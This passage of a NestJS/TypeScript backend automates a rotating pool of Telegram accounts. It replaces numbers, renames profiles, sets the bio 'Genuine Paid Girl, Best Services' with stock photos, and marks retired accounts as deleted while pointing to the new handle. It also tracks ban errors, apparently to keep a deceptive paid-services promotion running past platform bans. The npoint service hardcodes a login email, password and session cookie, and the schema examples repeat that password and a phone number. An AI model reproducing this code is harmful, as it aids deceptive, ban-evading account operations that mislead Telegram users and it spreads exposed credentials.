Object.keys(query).every(key => client[key] === query[key]);\n            })\n            : allClients;\n        const results = filteredClients.map(client => {\n            const { session, mobile, password, promoteMobile, ...maskedClient } = client;\n            return maskedClient;\n        });\n        return results;\n    }\n\n    async refreshMap() {\n        console.log(\"Refreshed Clients\")\n        this.clientsMap.clear();\n    }\n\n    async findOne(clientId: string, throwErr: boolean = true): Promise<Client> {\n        const client = this.clientsMap.get(clientId)\n        if (client) {\n            return client;\n        } else {\n            const user = (await this.clientModel.findOne({ clientId }, { _id: 0, updatedAt: 0 }).exec())?.toJSON();\n            this.clientsMap.set(clientId, user);\n            if (!user && throwErr) {\n                throw new NotFoundException(`Client with ID \"${clientId}\" not found`);\n            }\n            return user;\n        }\n    }\n\n    async update(clientId: string, updateClientDto: UpdateClientDto): Promise<Client> {\n        delete updateClientDto['_id']\n        if ((<any>updateClientDto)._doc) {\n            delete (<any>updateClientDto)._doc['_id']\n        }\n        await fetchWithTimeout(`${ppplbot()}&text=Updating the Existing client: ${clientId}`);\n        const updatedUser = await this.clientModel.findOneAndUpdate({ clientId }, { $set: updateClientDto }, { new: true, upsert: true }).exec();\n        if (!updatedUser) {\n            throw new NotFoundException(`Client with ID \"${clientId}\" not found`);\n        }\n        this.clientsMap.set(clientId, updatedUser);\n        await fetchWithTimeout(`${process.env.uptimeChecker}/refreshmap`);\n        await fetchWithTimeout(`${process.env.uptimebot}/refreshmap`);\n        console.log(\"Refreshed Maps\")\n        return updatedUser;\n    }\n\n    async remove(clientId: string): Promise<Client> {\n        const deletedUser = await this.clientModel.findOneAndDelete({ clientId }).exec();\n        if (!deletedUser) {\n            throw new NotFoundException(`Client with ID \"${clientId}\" not found`);\n        }\n        return deletedUser;\n    }\n\n    async search(filter: any): Promise<Client[]> {\n        console.log(filter)\n        if (filter.firstName) {\n            filter.firstName = { $regex: new RegExp(filter.firstName, 'i') }\n        }\n        console.log(filter)\n        return this.clientModel.find(filter).exec();\n    }\n\n    async setupClient(clientId: string, setupClientQueryDto: SetupClientQueryDto) {\n        console.log(`Received New Client Request for - ${clientId}`)\n        if (toBoolean(process.env.AUTO_CLIENT_SETUP) && Date.now() > (settingupClient + 240000)) {\n            settingupClient = Date.now();\n            const existingClient = await this.findOne(clientId);\n            const existingClientMobile = existingClient.mobile\n            await fetchWithTimeout(`${ppplbot()}&text=Received New Client Request for - ${clientId} - OldNumber: ${existingClient.mobile} || ${existingClient.username}`);\n            console.log(setupClientQueryDto);\n            await this.telegramService.disconnectAll();\n            const today = (new Date(Date.now())).toISOString().split('T')[0];\n            const query = { availableDate: { $lte: today }, channels: { $gt: 200 } }\n            const newBufferClient = (await this.bufferClientService.executeQuery(query, { tgId: 1 }))[0];\n            try {\n                if (newBufferClient) {\n                    this.telegramService.setActiveClientSetup({ ...setupClientQueryDto, clientId, existingMobile: existingClientMobile, newMobile: newBufferClient.mobile })\n\n                    await this.telegramService.createClient(newBufferClient.mobile);\n                    const newSession = await this.telegramService.createNewSession(newBufferClient.mobile);\n                    await this.telegramService.deleteClient(newBufferClient.mobile)\n                    await this.updateClientSession(newSession)\n                } else {\n                    await fetchWithTimeout(`${ppplbot()}&text=Buffer Clients not available`);\n                    console.log(\"Buffer Clients not available\")\n                }\n\n                // const archivedClient = await this.archivedClientService.findOne(newBufferClient.mobile)\n                // if (archivedClient) {\n                //     await fetchWithTimeout(`${ppplbot()}&text=Using Old Session from Archived Clients- NewNumber:${newBufferClient.mobile}`);\n                //     await this.updateClientSession(archivedClient.session)\n                // } else {\n                //     await this.telegramService.createClient(newBufferClient.mobile, false, true);\n                //     await this.generateNewSession(newBufferClient.mobile)\n                // }\n            } catch (error) {\n                parseError(error);\n                await this.telegramService.deleteClient(newBufferClient.mobile);\n                console.log(\"Removing buffer as error\")\n                const availableDate = (new Date(Date.now() + (3 * 24 * 60 * 60 * 1000))).toISOString().split('T')[0]\n                await this.bufferClientService.createOrUpdate(newBufferClient.mobile, { availableDate });\n                this.telegramService.setActiveClientSetup(undefined)\n            }\n        } else {\n            console.log(\"Profile Setup Recently tried, wait ::\", settingupClient - Date.now());\n        }\n    }\n\n    async updateClientSession(newSession: string) {\n        try {\n            const setup = this.telegramService.getActiveClientSetup();\n            const { days, archiveOld, clientId, existingMobile, formalities, newMobile } = setup;\n            await this.telegramService.disconnectAll();\n            await sleep(2000)\n            let updatedUsername;\n            await this.telegramService.createClient(newMobile, false, true);\n            const username = (clientId?.match(/[a-zA-Z]+/g)).toString();\n            const userCaps = username[0].toUpperCase() + username.slice(1);\n            let baseUsername = `${userCaps}_Red` + fetchNumbersFromString(clientId)\n            updatedUsername = await this.telegramService.updateUsername(newMobile, baseUsername);\n            await fetchWithTimeout(`${ppplbot()}&text=Updated username for NewNumber:${newMobile} || ${updatedUsername}`);\n            await this.telegramService.deleteClient(newMobile);\n            const existingClientUser = (await this.usersService.search({ mobile: existingMobile }))[0];\n            const existingClient = await this.findOne(clientId);\n            this.update(clientId, { mobile: newMobile, username: updatedUsername, session: newSession });\n            await fetchWithTimeout(existingClient.deployKey, {}, 1);\n            await this.bufferClientService.remove(newMobile);\n            setTimeout(async () => {\n                await this.updateClient(clientId);\n            }, 10000);\n\n            try {\n                if (existingClientUser) {\n                    try {\n                        if (toBoolean(formalities)) {\n                            await this.telegramService.createClient(existingMobile, false, true);\n                            console.log(\"Started Formalities\");\n                            await this.telegramService.updateNameandBio(existingMobile, 'Deleted Account', `New Acc: @${updatedUsername}`);\n                            await this.telegramService.deleteProfilePhotos(existingMobile)\n                            await this.telegramService.updateUsername(existingMobile, '');\n                            await this.telegramService.updatePrivacyforDeletedAccount(existingMobile);\n                            console.log(\"Formalities finished\");\n                            await this.telegramService.deleteClient(existingMobile);\n                            await fetchWithTimeout(`${ppplbot()}&text=Formalities finished`);\n                        } else {\n                            console.log(\"Formalities skipped\")\n                        }\n                        if (archiveOld) {\n                            const availableDate = (new Date(Date.now() + ((days + 1) * 24 * 60 * 60 * 1000))).toISOString().split('T')[0];\n                            const bufferClientDto: CreateBufferClientDto | UpdateBufferClientDto = {\n                                mobile: existingMobile,\n                                availableDate,\n                                session: existingClientUser.session,\n                                tgId: existingClientUser.tgId,\n                                channels: 170\n                            }\n                            const updatedBufferClient = await this.bufferClientService.createOrUpdate(existingMobile, bufferClientDto);\n                            // await this.archivedClientService.update(existingMobile, existingClient);\n                            console.log(\"client Archived: \", updatedBufferClient);\n                            await fetchWithTimeout(`${ppplbot()}&text=Client Archived`);\n                        } else {\n                            console.log(\"Client Archive Skipped\")\n                            await fetchWithTimeout(`${ppplbot()}&text=Client Archive Skipped`);\n                        }\n                    } catch (error) {\n                        console.log(\"Cannot Archive Old Client\");\n                        const errorDetails = parseError(error);\n                        if (contains(errorDetails.message.toLowerCase(), ['expired', 'unregistered', 'deactivated', \"session_revoked\", \"user_deactivated_ban\"])) {\n                            console.log(\"Deleting User: \", existingClientUser.mobile);\n                            await this.bufferClientService.remove(existingClientUser.mobile);\n                            await this.archivedClientService.remove(existingClientUser.mobile);\n                        } else {\n                            console.log('Not Deleting user');\n                        }\n                    }\n                }\n            } catch (error) {\n                parseError(error);\n            }\n            this.telegramService.setActiveClientSetup(undefined)\n\n            console.log(\"Update finished Exitting Exiiting TG Service\");\n            await fetchWithTimeout(`${ppplbot()}&text=Update finished`);\n            await this.telegramService.disconnectAll();\n\n        } catch (e) {\n            parseError(e);\n            this.telegramService.setActiveClientSetup(undefined)\n        }\n    }\n\n    async updateClient(clientId: string) {\n        const client = await this.findOne(clientId);\n        try {\n            await CloudinaryService.getInstance(client?.dbcoll?.toLowerCase());\n            const telegramClient = await this.telegramService.createClient(client.mobile, true, false);\n            await sleep(2000)\n            const me = await telegramClient.getMe();\n            if (me.username !== client.username || !me.username.toLowerCase().startsWith(me.firstName.split(' ')[0].toLowerCase())) {\n                const username = (clientId?.match(/[a-zA-Z]+/g)).toString();\n                const userCaps = username[0].toUpperCase() + username.slice(1);\n                let baseUsername = `${userCaps}_Red` + fetchNumbersFromString(clientId);\n                const updatedUsername = await telegramClient.updateUsername(baseUsername);\n                await this.update(client.clientId, { username: updatedUsername })\n            }\n            await sleep(2000)\n            if (me.firstName !== client.name) {\n                await telegramClient.updateProfile(client.name, \"Genuine Paid Girl🥰, Best Services❤️\");\n            }\n            await sleep(3000)\n            await telegramClient.deleteProfilePhotos();\n            await sleep(3000)\n            await telegramClient.updatePrivacy();\n            await sleep(3000)\n            const rootPath = process.cwd();\n            await telegramClient.updateProfilePic(path.join(rootPath, 'dp1.jpg'));\n            await sleep(3000);\n            await telegramClient.updateProfilePic(path.join(rootPath, 'dp2.jpg'));\n            await sleep(3000);\n            await telegramClient.updateProfilePic(path.join(rootPath, 'dp3.jpg'));\n            await sleep(2000);\n            await this.telegramService.deleteClient(client.mobile)\n        } catch (error) {\n            parseError(error)\n        }\n    }\n\n\n    async updateClients() {\n        const clients = await this.findAll();\n        for (const client of clients) {\n            await this.updateClient(client.clientId)\n        }\n    }\n\n    async generateNewSession(phoneNumber: string, attempt: number = 1) {\n        try {\n            console.log(\"String Generation started\");\n            await fetchWithTimeout(`${ppplbot()}&text=String Generation started for NewNumber:${phoneNumber}`);\n            await sleep(1000);\n            const response = await fetchWithTimeout(`${process.env.uptimebot}/login?phone=${phoneNumber}&force=${true}`, { timeout: 15000 }, 1);\n            if (response) {\n                console.log(`Code Sent successfully`, response.data);\n                await fetchWithTimeout(`${ppplbot()}&text=Code Sent successfully`);\n                await this.bufferClientService.update(phoneNumber, { availableDate: (new Date(Date.now() + (24 * 60 * 60 * 1000))).toISOString().split('T')[0] })\n            } else {\n                await fetchWithTimeout(`${ppplbot()}&text=Failed to send Code`);\n                console.log(\"Failed to send Code\", response);\n                if (attempt < 2) {\n                    await sleep(8000);\n                    await this.generateNewSession(phoneNumber, attempt + 1);\n                }\n            }\n        } catch (error) {\n            console.log(error);\n            if (attempt < 2) {\n                await sleep(8000);\n                await this.generateNewSession(phoneNumber, attempt + 1);\n            }\n        }\n    }\n\n    async executeQuery(query: any, sort?: any, limit?: number, skip?: number): Promise<Client[]> {\n        try {\n            if (!query) {\n                throw new BadRequestException('Query is invalid.');\n            }\n            const queryExec = this.clientModel.find(query);\n\n            if (sort) {\n                queryExec.sort(sort);\n            }\n\n            if (limit) {\n                queryExec.limit(limit);\n            }\n\n            if (skip) {\n                queryExec.skip(skip);\n            }\n\n            return await queryExec.exec();\n        } catch (error) {\n            throw new InternalServerErrorException(error.message);\n        }\n    }\n\n    async addPromoteMobile(clientId: string, mobileNumber: string): Promise<Client> {\n        return this.clientModel.findOneAndUpdate(\n            { clientId }, // Filter by clientId\n            { $addToSet: { promoteMobile: mobileNumber } }, // Add only if it doesn't already exist\n            { new: true } // Return the updated document\n        ).exec();\n    }\n\n    async removePromoteMobile(clientId: string, mobileNumber: string): Promise<Client> {\n        return this.clientModel.findOneAndUpdate(\n            { clientId }, // Filter by clientId\n            { $pull: { promoteMobile: mobileNumber } }, // Remove the specified number\n            { new: true } // Return the updated document\n        ).exec();\n    }\n}\n","import { ApiProperty } from '@nestjs/swagger';\n\nexport class CreateClientDto {\n    @ApiProperty({ example: 'paid_giirl_shruthiee', description: 'Channel link of the user' })\n    readonly channelLink: string;\n\n    @ApiProperty({ example: 'shruthi', description: 'Database collection name' })\n    readonly dbcoll: string;\n\n    @ApiProperty({ example: 'PaidGirl.netlify.app/Shruthi1', description: 'Link of the user' })\n    readonly link: string;\n\n    @ApiProperty({ example: 'Shruthi Reddy', description: 'Name of the user' })\n    readonly name: string;\n\n    @ApiProperty({ example: '+916265240911', description: 'Phone number of the user' })\n    readonly mobile: string;\n\n    @ApiProperty({ example: 'Ajtdmwajt1@', description: 'Password of the user' })\n    readonly password: string;\n\n    @ApiProperty({ example: 'https://shruthi1.glitch.me', description: 'Repl link of the user' })\n    readonly repl: string;\n\n    @ApiProperty({ example: 'https://shruthiprom0101.glitch.me', description: 'Promotion Repl link of the user' })\n    readonly promoteRepl: string;\n\n    @ApiProperty({ example: '1BQANOTEuMTA4LjUg==', description: 'Session token' })\n    readonly session: string;\n\n    @ApiProperty({ example: 'ShruthiRedd2', description: 'Username of the user' })\n    readonly username: string;\n\n    @ApiProperty({ example: 'shruthi1', description: 'Client ID of the user' })\n    readonly clientId: string;\n\n    @ApiProperty({ example: 'https://shruthi1.glitch.me/exit', description: 'Deployment key URL' })\n    readonly deployKey: string;\n\n    @ApiProperty({ example: 'ShruthiRedd2', description: 'Main account of the user' })\n    readonly mainAccount: string;\n\n    @ApiProperty({ example: 'booklet_10', description: 'Product associated with the user' })\n    readonly product: string;\n\n    @ApiProperty({ example: ['916265240911'], description: 'Promote mobile number of the user', required: false, type: [String] })\n    readonly promoteMobile?: string[];\n}\n","import { ApiPropertyOptional } from '@nestjs/swagger';\nimport { Transform, TransformFnParams } from 'class-transformer';\nimport { IsOptional, IsString, IsArray, IsUrl, Matches, ArrayNotEmpty } from 'class-validator';\n\nexport class SearchClientDto {\n    @ApiPropertyOptional({ description: 'Client ID of the client' })\n    @Transform(({ value }: TransformFnParams) => value?.trim().toLowerCase())\n    @IsOptional()\n    @IsString()\n    @Matches(/^[a-z0-9_-]{3,50}$/i, { message: 'Invalid client ID format' })\n    clientId?: string;\n\n    @ApiPropertyOptional({ description: 'Database collection name' })\n    @Transform(({ value }: TransformFnParams) => value?.trim().toLowerCase())\n    @IsOptional()\n    @IsString()\n    dbcoll?: string;\n\n    @ApiPropertyOptional({ description: 'Channel link of the client' })\n    @Transform(({ value }: TransformFnParams) => value?.trim())\n    @IsOptional()\n    @IsString()\n    channelLink?: string;\n\n    @ApiPropertyOptional({ description: 'Link of the client' })\n    @Transform(({ value }: TransformFnParams) => value?.trim())\n    @IsOptional()\n    @IsUrl({}, { message: 'Invalid URL format' })\n    link?: string;\n\n    @ApiPropertyOptional({ description: 'Name of the client' })\n    @Transform(({ value }: TransformFnParams) => value?.trim())\n    @IsOptional()\n    @IsString()\n    name?: string;\n\n    @ApiPropertyOptional({ description: 'Phone number of the client' })\n    @Transform(({ value }: TransformFnParams) => value?.trim())\n    @IsOptional()\n    @Matches(/^\\+?[0-9]{10,15}$/, { message: 'Invalid phone number format' })\n    number?: string;\n\n    @ApiPropertyOptional({ description: 'Password of the client' })\n    @IsOptional()\n    @IsString()\n    password?: string;\n\n    @ApiPropertyOptional({ description: 'Repl link of the client' })\n    @Transform(({ value }: TransformFnParams) => value?.trim())\n    @IsOptional()\n    @IsUrl({}, { message: 'Invalid URL format' })\n    repl?: string;\n\n    @ApiPropertyOptional({ description: 'Promotion Repl link of the client' })\n    @Transform(({ value }: TransformFnParams) => value?.trim())\n    @IsOptional()\n    @IsUrl({}, { message: 'Invalid URL format' })\n    promoteRepl?: string;\n\n    @ApiPropertyOptional({ description: 'Clientname of the client' })\n    @Transform(({ value }: TransformFnParams) => value?.trim())\n    @IsOptional()\n    @IsString()\n    clientName?: string;\n\n    @ApiPropertyOptional({ description: 'Deployment key URL' })\n    @Transform(({ value }: TransformFnParams) => value?.trim())\n    @IsOptional()\n    @IsUrl({}, { message: 'Invalid URL format' })\n    deployKey?: string;\n\n    @ApiPropertyOptional({ description: 'Main account of the client' })\n    @Transform(({ value }: TransformFnParams) => value?.trim().toLowerCase())\n    @IsOptional()\n    @IsString()\n    mainAccount?: string;\n\n    @ApiPropertyOptional({ description: 'Product associated with the client' })\n    @Transform(({ value }: TransformFnParams) => value?.trim())\n    @IsOptional()\n    @IsString()\n    product?: string;\n\n    @ApiPropertyOptional({ description: 'Promote mobile numbers of the client' })\n    @Transform(({ value }: TransformFnParams) => value?.map((v: string) => v?.trim()))\n    @IsOptional()\n    @IsArray()\n    @ArrayNotEmpty({ message: 'Promote mobile numbers must not be empty if provided' })\n    @Matches(/^\\+?[0-9]{10,15}$/, { each: true, message: 'Invalid phone number format in promoteMobile' })\n    promoteMobile?: string[];\n}\n","import { PartialType } from '@nestjs/swagger';\nimport { CreateClientDto } from './create-client.dto';\n\nexport class UpdateClientDto extends PartialType(CreateClientDto) {}\n","import { Prop, Schema, SchemaFactory } from '@nestjs/mongoose';\nimport { ApiProperty } from '@nestjs/swagger';\nimport { Document } from 'mongoose';\n\nexport type ClientDocument = Client & Document;\n\n@Schema({\n    collection: 'clients', versionKey: false, autoIndex: true, timestamps: true,\n    toJSON: {\n        virtuals: true,\n        transform: (doc, ret) => {\n            delete ret._id;\n        },\n    },\n})\nexport class Client {\n    @ApiProperty({ example: 'paid_giirl_shruthiee', description: 'Channel link of the user' })\n    @Prop({ required: true })\n    channelLink: string;\n\n    @ApiProperty({ example: 'shruthi', description: 'Database collection name' })\n    @Prop({ required: true })\n    dbcoll: string;\n\n    @ApiProperty({ example: 'PaidGirl.netlify.app/Shruthi1', description: 'Link of the user' })\n    @Prop({ required: true })\n    link: string;\n\n    @ApiProperty({ example: 'Shruthi Reddy', description: 'Name of the user' })\n    @Prop({ required: true })\n    name: string;\n\n    @ApiProperty({ example: '916265240911', description: 'mobile number of the user' })\n    @Prop({ required: true })\n    mobile: string;\n\n    @ApiProperty({ example: 'Ajtdmwajt1@', description: 'Password of the user' })\n    @Prop({ required: true })\n    password: string;\n\n    @ApiProperty({ example: 'https://shruthi1.glitch.me', description: 'Repl link of the user' })\n    @Prop({ required: true })\n    repl: string;\n\n    @ApiProperty({ example: 'https://shruthiprom0101.glitch.me', description: 'Promotion Repl link of the user' })\n    @Prop({ required: true })\n    promoteRepl: string;\n\n    @ApiProperty({ example: '1BQANOTEuM==', description: 'Session token' })\n    @Prop({ required: true })\n    session: string;\n\n    @ApiProperty({ example: 'ShruthiRedd2', description: 'Username of the user' })\n    @Prop({ required: true })\n    username: string;\n\n    @ApiProperty({ example: 'shruthi1', description: 'Client ID of the user' })\n    @Prop({ required: true })\n    clientId: string;\n\n    @ApiProperty({ example: 'https://shruthi1.glitch.me/exit', description: 'Deployment key URL' })\n    @Prop({ required: true })\n    deployKey: string;\n\n    @ApiProperty({ example: 'ShruthiRedd2', description: 'Main account of the user' })\n    @Prop({ required: true })\n    mainAccount: string;\n\n    @ApiProperty({ example: 'booklet_10', description: 'Product associated with the user' })\n    @Prop({ required: true })\n    product: string;\n\n    @ApiProperty({ example: ['916265240911'], description: 'Promote mobile number of the user' })\n    @Prop({ required: false, type: [String] })\n    promoteMobile: string[];\n}\n\nexport const ClientSchema = SchemaFactory.createForClass(Client);\n","import {\n    Controller,\n    Get,\n    Post,\n    Put,\n    Param,\n    Body,\n    HttpException,\n    HttpStatus,\n  } from '@nestjs/common';\n  import { NpointService } from './npoint.service';\n  import {\n    ApiTags,\n    ApiOperation,\n    ApiParam,\n    ApiBody,\n    ApiResponse,\n  } from '@nestjs/swagger';\n  \n  @ApiTags('NPoint API') // Group endpoints under \"NPoint API\" in Swagger UI\n  @Controller('npoint')\n  export class NpointController {\n    constructor(private readonly npointService: NpointService) {}\n  \n    @Get('documents/:id')\n    @ApiOperation({ summary: 'Fetch a document by ID' }) // Description of the endpoint\n    @ApiParam({ name: 'id', description: 'The ID of the document to fetch' }) // Document the parameter\n    @ApiResponse({\n      status: 200,\n      description: 'Document fetched successfully',\n    })\n    @ApiResponse({ status: 404, description: 'Document not found' })\n    async fetchDocument(@Param('id') id: string) {\n      try {\n        return await this.npointService.fetchDocument(id);\n      } catch (error) {\n        throw new HttpException(error.message, HttpStatus.NOT_FOUND);\n      }\n    }\n  \n    @Post('documents')\n    @ApiOperation({ summary: 'Post a new document' })\n    @ApiBody({\n      description: 'The document to post',\n      schema: {\n        example: {\n          title: 'My Document',\n          content: 'This is the content of the document.',\n        },\n      },\n    })\n    @ApiResponse({\n      status: 201,\n      description: 'Document posted successfully',\n    })\n    @ApiResponse({ status: 400, description: 'Invalid input' })\n    async postDocument(@Body() document: any) {\n      try {\n        return await this.npointService.postDocument(document);\n      } catch (error) {\n        throw new HttpException(error.message, HttpStatus.BAD_REQUEST);\n      }\n    }\n\n    @Get('documents')\n    @ApiOperation({ summary: 'Fetch all documents' })\n    @ApiResponse({\n      status: 200,\n      description: 'List of all documents fetched successfully',\n    })\n    @ApiResponse({ status: 500, description: 'Internal server error' })\n    async fetchAllDocuments() {\n      try {\n        return await this.npointService.fetchAllDocuments();\n      } catch (error) {\n        throw new HttpException(error.message, HttpStatus.INTERNAL_SERVER_ERROR);\n      }\n    }  \n  \n    @Put('documents/:id')\n    @ApiOperation({ summary: 'Update a document by ID' })\n    @ApiParam({ name: 'id', description: 'The ID of the document to update' })\n    @ApiBody({\n      description: 'The updated document',\n      schema: {\n        example: {\n          title: 'Updated Document',\n          content: 'This is the updated content of the document.',\n        },\n      },\n    })\n    @ApiResponse({\n      status: 200,\n      description: 'Document updated successfully',\n    })\n    @ApiResponse({ status: 404, description: 'Document not found' })\n    async updateDocument(@Param('id') id: string, @Body() updatedDocument: any) {\n      try {\n        return await this.npointService.updateDocument(id, updatedDocument);\n      } catch (error) {\n        throw new HttpException(error.message, HttpStatus.NOT_FOUND);\n      }\n    }\n  }","import { Module } from '@nestjs/common';\nimport { NpointService } from './npoint.service';\nimport { NpointController } from './npoint.controller';\n\n@Module({\n  controllers: [NpointController],\n  providers: [NpointService],\n  exports: [NpointService]\n})\nexport class NpointModule {}","import { Injectable, Logger } from '@nestjs/common';\nimport axios from 'axios';\n\n@Injectable()\nexport class NpointService {\n    private readonly logger = new Logger(NpointService.name);\n    private csrfToken: string | null = null;\n    private cookie: string | null = '_npoint_session=MTBOeElFZ0pXV0oxTm9xd1dQQ0tNYnhVYWg1blFCMUVtUUJVWFQ1cGZwdlNwSTdacjBVTStJbDlHaGlWd0pGUDRzUmRaYnZNQVNTMTVmY1R6dEVUd0RPMXVFcmE1cnFYY09qd1A5TFpNVnZOUnVJRnlWV3ZtODk0ajlQVXQ0QzQ0MUtGeU5mTTB5dGFPNCtLUW9tVy9yTmFRZzlRQUdRK0NkQVVtZGxtMVEySzN0TC9sUjdMR2RjVW5xTmtleWw4TWdPOVNMa2JaZEs1c1o3eGE3UHdsQ2JiTEdQbHhUaysraCsrcG9LM25YREdyTDdpYWlHQ0wraEhNV3NXbzJtK1YvVzEvVTh2Z0N5bnpzU1hqcndiM041L2I3R29UMDY3RitBYkxvTktWaUVmdTg4SGJORjRTS25uZ2JDSWhmNWFoem0vNGNvUnAzMDBsQ0FJcUZTMjdnPT0tLWs2a2x2SUZqcHhDN1A0eFdUaWhBeVE9PQ%3D%3D--4d0883b9956c6d2744389228dab7321ff2eb88e5';\n    private readonly baseUrl = 'https://www.npoint.io'; // Replace with your API base URL\n    private readonly signInUrl = 'https://www.npoint.io/users/sign_in'; // Replace with your sign-in API URL\n\n    // Method to fetch CSRF token from the sign-in API\n    private async fetchCsrfToken(): Promise<string> {\n        this.logger.debug('Fetching CSRF token...');\n        try {\n            let data = JSON.stringify({\n                \"user\": {\n                    \"email\": \"dodieajt@gmail.com\",\n                    \"password\": \"Ajtdmwajt1@\"\n                }\n            });\n\n            let config = {\n                method: 'post',\n                maxBodyLength: Infinity,\n                url: this.signInUrl,\n                headers: {\n                    'Content-Type': 'application/json',\n                    'Cookie': this.cookie\n                },\n                data: data\n            };\n\n            const response = await axios.request(config)\n            console.log(\"Cookie:\", response.headers['set-cookie'][0]);\n            this.cookie = response.headers['set-cookie'][0];\n            // Extract CSRF token from the response (adjust based on your API response structure)\n            this.csrfToken = await this.fetchCsrfTokenFromHtml(response.data);\n\n            if (!this.csrfToken) {\n                throw new Error('CSRF token not found in the sign-in response.');\n            }\n\n            this.logger.debug('CSRF token fetched successfully.');\n            return this.csrfToken;\n        } catch (error) {\n            this.logger.error(`Failed to fetch CSRF token: ${error.message}`);\n            throw new Error(`Failed to fetch CSRF token: ${error.message}`);\n        }\n    }\n\n    // Method to ensure CSRF token is available\n    private async ensureCsrfToken(): Promise<void> {\n        if (!this.csrfToken) {\n            await this.fetchCsrfToken();\n        }\n    }\n\n    // Method to fetch a document\n    async fetchDocument(documentId: string): Promise<any> {\n        this.logger.debug(`Fetching document with ID: ${documentId}`);\n        await this.ensureCsrfToken();\n\n        try {\n            const response = await axios.get(`${this.baseUrl}/documents/${documentId}`, {\n                headers: {\n                    'X-CSRF-Token': this.csrfToken, // Include CSRF token in the headers\n                    'Cookie': this.cookie\n                },\n            });\n\n            this.logger.debug(`Document with ID: ${documentId} fetched successfully.`);\n            return response.data;\n        } catch (error) {\n            this.logger.error(`Failed to fetch document with ID: ${documentId}: ${error.message}`);\n            throw new Error(`Failed to fetch document: ${error.message}`);\n        }\n    }\n\n    // Method to post a document\n    async postDocument(document: any): Promise<any> {\n        this.logger.debug('Posting a new document...');\n        await this.ensureCsrfToken();\n\n        try {\n            const response = await axios.post(`${this.baseUrl}/documents`, { \"generate_contents\": true }, {\n                headers: {\n                    'X-CSRF-Token': this.csrfToken, // Include CSRF token in the headers\n                    'Cookie': this.cookie\n                },\n            });\n\n            this.logger.debug(`Document posted successfully. Updating document with token: ${response.data.token}`);\n            await this.updateDocument(response.data.token, document);\n            return response.data;\n        } catch (error) {\n            this.logger.error(`Failed to post document: ${error.message}`);\n            throw new Error(`Failed to post document: ${error.message}`);\n        }\n    }\n\n    // Method to update a document\n    async updateDocument(documentId: string, updatedDocument: any): Promise<any> {\n        this.logger.debug(`Updating document with ID: ${documentId}`);\n        await this.ensureCsrfToken();\n\n        // const oldDocument = (await axios.get(`https://api.npoint.io/${documentId}`)).data;\n        const body =\n        {\n            \"contents\": JSON.stringify(updatedDocument),\n            \"original_contents\": JSON.stringify(updatedDocument),\n            \"schema\": null,\n            \"original_schema\": \"\"\n        }\n\n        try {\n            const response = await axios.put(\n                `${this.baseUrl}/documents/${documentId}`,\n                body,\n                {\n                    headers: {\n                        'X-CSRF-Token': this.csrfToken, // Include CSRF token in the headers\n                        'Cookie': this.cookie\n                    },\n                },\n            );\n\n            this.logger.debug(`Document with ID: ${documentId} updated successfully.`);\n            return response.data;\n        } catch (error) {\n            this.logger.error(`Failed to update document with ID: ${documentId}: ${error.message}`);\n            throw new Error(`Failed to update document: ${error.message}`);\n        }\n    }\n\n    async fetchAllDocuments(): Promise<any[]> {\n        await this.ensureCsrfToken();\n\n        try {\n            const response = await axios.get(`${this.baseUrl}/documents`, {\n                headers: {\n                    'X-CSRF-Token': this.csrfToken, // Include CSRF token in the headers\n                    'Cookie': this.cookie\n                },\n            });\n\n            return response.data;\n        } catch (error) {\n            throw new Error(`Failed to fetch all documents: ${error.message}`);\n        }\n    }\n\n    async fetchCsrfTokenFromHtml(data) {\n        try {\n            // Step 1: Use a regular expression to match the CSRF token in the <meta> tag\n            const csrfTokenMatch = data.match(/<meta name=\"csrf-token\" content=\"([^\"]+)\"/);\n\n            // Step 2: Check if the CSRF token was found\n            if (!csrfTokenMatch || !csrfTokenMatch[1]) {\n                throw new Error('CSRF token not found in the HTML response.');\n            }\n\n            // Step 3: Extract the CSRF token\n            const csrfToken = csrfTokenMatch[1];\n\n            // Log the CSRF token (optional)\n            console.log('CSRF Token:', csrfToken);\n\n            return csrfToken;\n        } catch (error) {\n            console.error('Error fetching CSRF token:', error);\n        }\n    }\n}","import { ApiProperty } from '@nestjs/swagger';\nimport {  IsNumber, IsString } from 'class-validator';\n\nexport class CreatePromoteClientDto {\n  @ApiProperty({\n    description: 'Telegram ID of the client',\n    example: '123456789',\n  })\n  @IsString()\n  readonly tgId: string;\n\n  @ApiProperty({\n    description: 'Mobile number of the client',\n    example: '+1234567890',\n  })\n  @IsString()\n  readonly mobile: string;\n\n  @ApiProperty({\n    description: 'Date of the session',\n    example: '2023-06-22',\n  })\n  @IsString()\n  readonly availableDate: string;\n\n  @ApiProperty({\n    description: 'lastActive identifier',\n    example: '2023-06-22',\n  })\n  @IsString()\n  readonly lastActive: string;\n\n  @ApiProperty({\n    description: 'Channel Count',\n    example: 23,\n    type: Number\n  })\n  @IsNumber()\n  readonly channels: number;\n}\n","import { ApiPropertyOptional } from '@nestjs/swagger';\nimport { IsString, IsBoolean, IsOptional, IsNumber } from 'class-validator';\n\nexport class SearchPromoteClientDto {\n  @ApiPropertyOptional({\n    description: 'Telegram ID of the client',\n    example: '123456789',\n  })\n  @IsOptional()\n  @IsString()\n  readonly tgId?: string;\n\n  @ApiPropertyOptional({\n    description: 'Mobile number of the client',\n    example: '+1234567890',\n  })\n  @IsOptional()\n  @IsString()\n  readonly mobile?: string;\n\n  @ApiPropertyOptional({\n    description: 'availableDate of the promoteClient',\n    example: '2023-06-22',\n  })\n  @IsOptional()\n  @IsString()\n  readonly availableDate?: string;\n\n  @ApiPropertyOptional({\n    description: 'Channel Count',\n    example: 23,\n    type: Number\n  })\n  @IsNumber()\n  readonly channels?: number;\n}\n","import { PartialType } from '@nestjs/swagger';\nimport { CreatePromoteClientDto } from './create-promote-client.dto';\n\nexport class UpdatePromoteClientDto extends PartialType(CreatePromoteClientDto) {}\n","import { Controller, Get, Post, Body, Param, Delete, Query, Patch, Put } from '@nestjs/common';\nimport { ApiTags, ApiOperation, ApiBody, ApiParam } from '@nestjs/swagger';\nimport { PromoteClientService } from './promote-client.service';\nimport { CreatePromoteClientDto } from './dto/create-promote-client.dto';\nimport { SearchPromoteClientDto } from './dto/search-promote-client.dto';\nimport { PromoteClient } from './schemas/promote-client.schema';\nimport { UpdatePromoteClientDto } from './dto/update-promote-client.dto';\n\n@ApiTags('Promote Clients')\n@Controller('promoteclients')\nexport class PromoteClientController {\n  constructor(private readonly clientService: PromoteClientService) { }\n\n  @Post()\n  @ApiOperation({ summary: 'Create user data' })\n  async create(@Body() createClientDto: CreatePromoteClientDto): Promise<PromoteClient> {\n    return this.clientService.create(createClientDto);\n  }\n\n  @Get('search')\n  @ApiOperation({ summary: 'Search user data' })\n  async search(@Query() query: SearchPromoteClientDto): Promise<PromoteClient[]> 